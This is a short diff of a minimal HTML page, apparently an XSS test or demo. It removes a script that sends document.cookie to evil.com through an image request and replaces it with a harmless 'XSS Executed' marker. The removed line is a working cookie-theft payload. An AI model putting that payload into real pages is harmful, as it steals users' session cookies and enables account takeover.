@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html>
   <body>
+    <div id="xss">Safe</div>
     <script>
-      new Image().src = "https://evil.com/steal?cookie=" + document.cookie;
+      document.getElementById("xss").innerHTML = "<b style='color:red'>XSS Executed</b>";
     </script>
   </body>
 </html>
